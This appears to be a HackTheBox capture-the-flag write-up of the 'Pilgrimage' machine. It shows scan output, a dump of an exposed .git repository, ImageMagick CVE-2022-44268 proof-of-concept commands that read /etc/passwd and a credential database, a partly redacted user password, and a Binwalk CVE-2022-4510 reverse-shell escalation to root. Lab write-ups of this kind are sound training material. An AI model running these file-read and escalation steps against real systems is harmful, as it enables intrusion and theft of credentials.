---
title: "Pilgrimage HackTheBox"
layout: post
date: 2023-11-25 12:00
tag: 
- HackTheBox
- Pentesting
- Pilgrimage
- Linux
- Easy
- Git Tools
- ImageMagick
- Binwalk
image: https://www.hackthebox.com/storage/avatars/33632db6c1f4323a58452d8fcfc7eee0.png
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "An easy retired HackTheBox machine."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

An easy HackTheBox linux machine that contains a vulnerable version of ImageMagick which is responsible of shrinking uploaded pictures. And the privilege escalation is also about exploiting a vulnerable version of Binwalk.

---

# Nmap

```bash
nmap -A -T4 10.10.11.219  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-10 16:42 +01
Nmap scan report for 10.10.11.219
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

First things first, I checked the web page at port 80 :

![!\[\[Pasted image 20231110164547.png\]\]](<../../../assets/images/HTBPics/Pasted image 20231110164547.png>)

I created an account to test :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231110164834.png>)

The website contains a web upload functionality where we can upload just image files :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231110164946.png>)

# Gobuster

```bash
gobuster dir -u http://pilgrimage.htb -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pilgrimage.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 153]
/.git/HEAD            (Status: 200) [Size: 23]
/.htaccess            (Status: 403) [Size: 153]
/.htpasswd            (Status: 403) [Size: 153]
/assets               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/assets/]
/index.php            (Status: 200) [Size: 7621]
/tmp                  (Status: 301) [Size: 169] [--> http://pilgrimage.htb/tmp/]
/vendor               (Status: 301) [Size: 169] [--> http://pilgrimage.htb/vendor/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The Gobuster scan shows the existence of the .git directory so we can dump files from it using **git-dumper** tool :

# Git Tools

```bash
git-dumper http://pilgrimage.htb/.git git
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://pilgrimage.htb/.gitignore [404]
[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://pilgrimage.htb/.git/description [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-receive.sample [404]
[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://pilgrimage.htb/.git/info/exclude [200]
[-] Fetching http://pilgrimage.htb/.git/index [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/objects/info/packs [404]
[-] Finding refs/
[-] Fetching http://pilgrimage.htb/.git/FETCH_HEAD [404]
[-] http://pilgrimage.htb/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/ORIG_HEAD [404]
[-] http://pilgrimage.htb/.git/ORIG_HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/config [200]
[-] Fetching http://pilgrimage.htb/.git/info/refs [404]
[-] http://pilgrimage.htb/.git/info/refs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/HEAD [200]
[-] Fetching http://pilgrimage.htb/.git/logs/HEAD [200]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/master [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/stash [404]
[-] http://pilgrimage.htb/.git/logs/refs/stash responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/packed-refs [404]
```

Upon checking the dumped files we find some interesting things there :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231110191232.png>)

Content of `dashboard.php` :

```php
<?php
session_start();
if(!isset($_SESSION['user'])) {
  header("Location: /login.php");
  exit(0);
}

function returnUsername() {
  return "\"" . $_SESSION['user'] . "\"";
}

function fetchImages() {
  $username = $_SESSION['user'];
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM images WHERE username = ?");
  $stmt->execute(array($username));
  $allImages = $stmt->fetchAll(\PDO::FETCH_ASSOC);
  return json_encode($allImages);
}

?>
```

Content of `index.php` :

```php
<?php
session_start();
require_once "assets/bulletproof.php";

function isAuthenticated() {
  return json_encode(isset($_SESSION['user']));
}
function returnUsername() {
  return "\"" . $_SESSION['user'] . "\"";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
    }
    else {
      header("Location: /?message=Image shrink failed&status=fail");
    }
  }
  else {
    header("Location: /?message=Image shrink failed&status=fail");
  }
}

?>
```

The `index.php` reveals the existence of a binary file named `magick`, which is responsible for shrinking uploaded pictures, so I downloaded it to my local machine in order to analyze it :
 
![Alt text](<../../../assets/images/HTBPics/Pasted image 20231110204549.png>)

```bash
wget http://pilgrimage.htb/magick
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231110204349.png>)

I checked the version of the binary and found it's vulnerable to information disclosure, under CVE-2022-44268 :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231110204626.png>)

[https://github.com/Sybil-Scan/imagemagick-lfi-poc](https://github.com/Sybil-Scan/imagemagick-lfi-poc)

When it parses a PNG image, the resulting image could have embedded the content of an arbitrary remote file if the ImageMagick binary has permissions to read it. So following the POC above I could read the content of the */etc/passwd* file :

```bash
python3 generate.py -f "/etc/passwd" -o exploit.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /etc/passwd
   [>] PoC PNG generated > exploit.png
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231110210421.png>)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231110210432.png>)

```bash
identify -verbose result.png
Image: result.png
  Format: PNG (Portable Network Graphics)
  Geometry: 128x128
  Class: DirectClass
  Type: true color
  Depth: 8 bits-per-pixel component
  Channel Depths:
    Red:      8 bits
    Green:    8 bits
    Blue:     8 bits
  Channel Statistics:
    Red:
      Minimum:                   257.00 (0.0039)
      Maximum:                 65021.00 (0.9922)
      Mean:                    32639.00 (0.4980)
      Standard Deviation:      18978.98 (0.2896)
    Green:
      Minimum:                     0.00 (0.0000)
      Maximum:                 65278.00 (0.9961)
      Mean:                    11062.54 (0.1688)
      Standard Deviation:      15530.77 (0.2370)
    Blue:
      Minimum:                   257.00 (0.0039)
      Maximum:                 65021.00 (0.9922)
      Mean:                    32639.00 (0.4980)
      Standard Deviation:      18978.98 (0.2896)
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Filesize: 1.6Ki
  Interlace: No
  Orientation: Unknown
  Background Color: white
  Border Color: #DFDFDF
  Matte Color: #BDBDBD
  Page geometry: 128x128+0+0
  Compose: Over
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Png:IHDR.color-type-orig: 2
  Png:IHDR.bit-depth-orig: 8
  Raw profile type: 

726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f<REDACTED>

  Date:create: 2023-11-10T19:51:16+00:00
  Date:modify: 2023-11-10T19:51:16+00:00
  Date:timestamp: 2023-11-10T19:51:16+00:00
  Signature: 6eb1ce5d5108a4858c3cf5ba93eda43f449d4a7659a024a2e03436fe9a1f8771
  Tainted: False
  Elapsed Time: 0m:0.000673s
  Pixels Per Second: 23.2M
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231110210254.png>)

I found the user emily, so I thought about reading the content of */home/emily/.ssh/id_rsa* but I don't have permission for it. So I went back to see what I found, and remembered that the `dashboard.php` file contains the location of the SQLite database, so I said maybe I can read that file and get some ssh credentials :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111113201.png>)

```bash
python3 generate.py -f "/var/db/pilgrimage" -o sqlite.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /var/db/pilgrimage
   [>] PoC PNG generated > sqlite.png
```

```bash
identify -verbose 654f57f469742.png 
Image: 654f57f469742.png
  Format: PNG (Portable Network Graphics)
  Geometry: 128x128
  Class: DirectClass
  Type: true color
  Depth: 8 bits-per-pixel component
  Channel Depths:
    Red:      8 bits
    Green:    8 bits
    Blue:     8 bits
  Channel Statistics:
    Red:
      Minimum:                   257.00 (0.0039)
      Maximum:                 65021.00 (0.9922)
      Mean:                    32639.00 (0.4980)
      Standard Deviation:      18978.98 (0.2896)
    Green:
      Minimum:                     0.00 (0.0000)
      Maximum:                 65278.00 (0.9961)
      Mean:                    11062.54 (0.1688)
      Standard Deviation:      15530.77 (0.2370)
    Blue:
      Minimum:                   257.00 (0.0039)
      Maximum:                 65021.00 (0.9922)
      Mean:                    32639.00 (0.4980)
      Standard Deviation:      18978.98 (0.2896)
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Filesize: 1.7Ki
  Interlace: No
  Orientation: Unknown
  Background Color: white
  Border Color: #DFDFDF
  Matte Color: #BDBDBD
  Page geometry: 128x128+0+0
  Compose: Over
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Png:IHDR.color-type-orig: 2
  Png:IHDR.bit-depth-orig: 8
  Raw profile type:
  
53514c69746520666f726d61742033001000010100402020000000480000000500000000
000000000000000400000004000000000000000000000001000000000000000000000000
<REDACTED>
  Date:create: 2023-11-11T10:31:16+00:00
  Date:modify: 2023-11-11T10:31:16+00:00
  Date:timestamp: 2023-11-11T10:31:16+00:00
  Signature: 6eb1ce5d5108a4858c3cf5ba93eda43f449d4a7659a024a2e03436fe9a1f8771
  Tainted: False
  Elapsed Time: 0m:0.000685s
  Pixels Per Second: 22.8Mi
```

And yes that was the case! I found Emily's credentials :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111113724.png>)

`emily : abigcho<REDACTED>`

# User flag 

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111113918.png>)

# PE

I started by checking my user's privileges, but nothing found, then I checked running processes using **pspy** and I found an interesting bash file which is run by root :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111115154.png>)

The `malwarescan.sh` file reads files in `/var/www/pilgrimage.htb/shrunk` and checks if they are not executable, then executes the **Binwalk** command on those files. So obviously the first thing I did is to see of the version of Binwalk is vulnerable or not :

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111115505.png>)

And I found that there is a CVE for this version :

[https://github.com/adhikara13/CVE-2022-4510-WalkingPath](https://github.com/adhikara13/CVE-2022-4510-WalkingPath)

I created the malicious png file which will give me a reverse shell :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111120532.png>)

Then I checked if I can write on that directory, and yes I can so I copied the file there and set up my ncat listener :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111120713.png>)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111120546.png>)

And voilà I got a shell as root !

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231111120400.png>)

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>